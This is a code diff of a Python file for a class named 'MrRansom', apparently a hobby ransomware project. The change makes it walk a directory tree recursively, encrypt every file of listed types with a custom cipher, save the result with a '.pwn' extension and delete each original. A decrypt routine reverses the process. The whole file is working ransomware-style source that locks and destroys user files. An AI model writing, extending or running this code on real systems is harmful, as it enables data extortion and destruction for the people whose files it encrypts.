@@ -1,11 +1,9 @@
-import base64
 import json
 import os
 import time
-from multiprocessing import Process
 
-from file_util import put_file, get_file, get_full_path
-from blockencrypter import BlockEncrypter, get_blocks
+from file_util import read_chunks, get_file
+from aldersonalgorithm import AldersonAlgorithm
 
 DECRYPT = 'decrypt'
 
@@ -17,7 +15,7 @@ ENCRYPTED_EXTENSION = ".pwn"
 
 
 def get_file_types_to_encrypt():
-    types_json = json.loads(get_file(get_full_path(FILE_TYPES_JSON)))
+    types_json = json.loads(get_file(os.path.join(os.path.dirname(os.path.realpath(__file__)), FILE_TYPES_JSON)))
 
     return [file_type for file_type in types_json["fileTypes"]]
 
@@ -25,14 +23,18 @@ def get_file_types_to_encrypt():
 FILE_TYPES_TO_ENCRYPT = get_file_types_to_encrypt()
 
 
-def get_files_to_process(files, root_dir, mode):
+def get_target_files(files, mode):
     files_to_process = []
     for file_path in files:
-        if mode == ENCRYPT and can_encrypt_file(file_path) \
-                or mode == DECRYPT and can_decrypt_file(file_path):
-            files_to_process.append(os.path.join(root_dir, file_path))
+        if should_process(file_path, mode):
+            files_to_process.append(file_path)
 
     return files_to_process
+
+
+def should_process(file_path, mode):
+    return mode == ENCRYPT and can_encrypt_file(file_path) \
+        or mode == DECRYPT and can_decrypt_file(file_path)
 
 
 def can_encrypt_file(filename):
@@ -46,80 +48,48 @@ def can_decrypt_file(file_name):
         return True
 
 
-def close_threads(workers):
-    for thread in workers:
-        thread.join()
-        workers.remove(thread)
-
-
-def get_process_args(input_file, mode):
-    if mode == ENCRYPT:
-        out_file = input_file + ENCRYPTED_EXTENSION
-    else:
-        out_file = input_file[:len(input_file) - len(ENCRYPTED_EXTENSION)]
-
-    return input_file, out_file
-
-
 class MrRansom:
 
-    def __init__(self, root_dir, key):
+    def __init__(self, key, root_dir):
         self.key = key
-        self.root_dir = root_dir
-        self.files = [file_name for file_name in os.listdir(self.root_dir)]
+        self.algorithm = AldersonAlgorithm(key)
+        self.all_files = [os.path.join(root, file_name) for root, directories, file_names in
+                          os.walk(root_dir) for file_name in file_names]
 
     def encrypt(self):
-        files_to_encrypt = get_files_to_process(self.files, self.root_dir, ENCRYPT)
-
-        self.process(files_to_encrypt, self.encrypt_file, ENCRYPT)
+        for file_path in get_target_files(self.all_files, ENCRYPT):
+            self.encrypt_file(file_path)
 
     def decrypt(self):
-        files_to_decrypt = get_files_to_process(self.files, self.root_dir, DECRYPT)
+        for file_path in get_target_files(self.all_files, DECRYPT):
+            self.decrypt_file(file_path)
 
-        self.process(files_to_decrypt, self.decrypt_file, DECRYPT)
-
-    @staticmethod
-    def process(files, method, mode):
+    def encrypt_file(self, in_file):
         start_time = time.time()
 
-        workers = []
-        for file_path in files:
-            thread = Process(target=method, args=get_process_args(file_path, mode))
-
-            workers.append(thread)
-
-            thread.start()
-
-        close_threads(workers)
-
-        print "Total time: {}s".format(time.time() - start_time)
-
-    def encrypt_file(self, in_file, out_file):
-        start_time = time.time()
-
-        self.process_file(self.key, in_file, out_file, ENCRYPT)
+        out_file = in_file + ENCRYPTED_EXTENSION
+        self.process(in_file, out_file, self.algorithm.encrypt_chunk)
 
         print "Encrypted '{}' in {}s".format(os.path.basename(in_file), time.time() - start_time)
 
-    def decrypt_file(self, in_file, out_file):
+    def decrypt_file(self, in_file):
         start_time = time.time()
 
-        self.process_file(self.key, in_file, out_file, DECRYPT)
+        out_file = in_file[:len(in_file) - len(ENCRYPTED_EXTENSION)]
+        self.process(in_file, out_file, self.algorithm.decrypt_chunk)
 
-        print "Took {}s decrypting '{}'".format(time.time() - start_time, os.path.basename(out_file))
+        print "Decrypted '{}' in {}s".format(os.path.basename(out_file), time.time() - start_time)
 
     @staticmethod
-    def process_file(key, in_file, out_file, mode):
-        file_bytes = get_file(in_file)
+    def process(in_file, out_file, process):
+        in_file_stream = open(in_file, "rb")
+        out_file_stream = open(out_file, "w")
 
-        if mode == ENCRYPT:
-            file_bytes = base64.b64encode(file_bytes)
+        for chunk in read_chunks(in_file_stream):
+            out_file_stream.write(process(chunk))
 
-        processed_bytes = BlockEncrypter(get_blocks(file_bytes), key).process(mode)
-
-        if mode == DECRYPT:
-            processed_bytes = base64.b64decode(processed_bytes)
-
-        put_file(processed_bytes, out_file)
+        in_file_stream.close()
+        out_file_stream.close()
 
         os.remove(in_file)
+
